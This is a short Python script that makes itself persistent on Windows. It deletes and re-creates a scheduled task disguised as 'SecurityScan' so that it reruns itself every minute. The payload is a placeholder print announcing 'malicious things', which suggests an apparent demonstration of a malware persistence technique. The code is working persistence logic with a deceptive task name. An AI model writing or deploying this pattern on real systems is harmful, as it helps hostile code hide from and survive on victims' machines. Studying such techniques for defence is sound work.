import os, random
from datetime import datetime, timedelta

# checks if a task is already scheduled
if os.system("schtasks /query /tn SecurityScan") == 0:
    os.system("schtasks /delete /f /tn SecurityScan")

print("I am doing malicious things")

# sets the file path
filedir = os.path.join(os.getcwd(), "sched.py")

max_interval = 1
interval = 1+(random.random()*(max_interval-1))

dt = datetime.now() + timedelta(minutes=interval)

t = "%s:%s" % (str(dt.hour).zfill(2), str(dt.minute).zfill(2))
d = "%s/%s/%s" % (str(dt.day).zfill(2), str(dt.month).zfill(2), dt.year)

# creates a scheduled task to run this file at a some time (t) minutes in the future
os.system("schtasks /create /tn SecurityScan /tr '"+ filedir + "' /sc once /st " + t + " /sd " + d)
input()